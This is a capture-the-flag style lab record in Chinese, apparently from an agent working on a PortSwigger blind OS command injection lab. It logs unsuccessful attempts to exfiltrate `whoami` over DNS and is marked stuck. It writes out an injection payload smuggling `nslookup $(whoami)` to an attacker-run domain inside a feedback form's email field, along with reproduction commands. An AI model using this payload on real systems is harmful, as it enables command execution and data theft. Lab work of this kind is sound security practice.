---
title: "lab-blind-out-of-band-data-exfiltration"
links:
  - target: oob-callback-family
    relation: evidences
  - target: blind-injection-family
    relation: evidences
---

# lab-blind-out-of-band-data-exfiltration

> evidences: [[oob-callback-family]], [[blind-injection-family]]

- 题面:Blind OS command injection with out-of-band data exfiltration(/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration)
- 实例:https://0aec0003036722a680a2443200cb0005.web-security-academy.net
- slug(真):即请求 slug(lab_id 3C2C7DC2…)
- 判定目标:执行 `whoami` 并经 DNS 外带,随后用“Submit solution”提交用户名;状态:**stuck**(OOB DNS 腿从 lab 侧不可达)

## 已确认

1. `/feedback` → POST `/feedback/submit`(同批字段);页面头部多一个
   `<button id='submitSolution' method='POST' path='/submitSolution' parameter='answer'>`(即拿回用户名后 POST `/submitSolution` `answer=<用户名>`)。
2. 外带尝试:`email=x@a.com||nslookup $(whoami).<m>.oob.dthack.io||`(及同批多字段/多分隔符),均无 OOB 命中。

## 未决面 / 卡点

- 与 `lab-blind-out-of-band` 同因:**lab 出站到自建 OOB 域不可达**(ns 自测正常、日志里零条 lab 源查询);
  未取到 `whoami` → 无法走到 `/submitSolution`。
- 需外部放行 lab 出站 / 换官方 Collaborator,方能区分“注入未执行”与“DNS 被挡”。

## 证据摘录

```
ns 自测: nslookup b16selftest.oob.dthack.io 127.0.0.1 -> dns.log 出现 b16selftest…(127.0.0.1)
lab 注入多次 -> grep b16 dns.log 仅 2 条(selftest)
```

## 复现命令

```
lab_launch launch 3C2C7DC2A5F53DC680195C18C290E82BC97C28F599414DB388CF8CF96CB72BF5 --widget-source /web-security/os-command-injection --jar /tmp/b16-jar2.json
lab_http get "<inst>/feedback" --jar /tmp/b16-jar2.json     # 取 csrf
lab_http post "<inst>/feedback/submit" --jar /tmp/b16-jar2.json --form csrf=<csrf> --form name=test \
  --form "email=x@a.com||nslookup \$(whoami).<m>.oob.dthack.io||" --form subject=s --form message=m
sh_run -- ssh ubuntu@47.131.34.33 "grep -i <m> ~/prs-oob/dns.log"
```

## 回马复核(OOB HTTP 腿已通后重试)

- 新实例 `0a0a00a603d8c5e481d2e94a00b000e8`;b18 重打四字段多分隔符(HTTP:9999/DNS),
  与 lab-blind-out-of-band 同批共 40+ 载荷,`oob-http.log`/`dns.log` 零 lab 源命中。
- 与同族题同因:**lab 出站到自建 OOB 不可达**;`whoami` 未取到,无法走 `/submitSolution`。
  不再硬造。
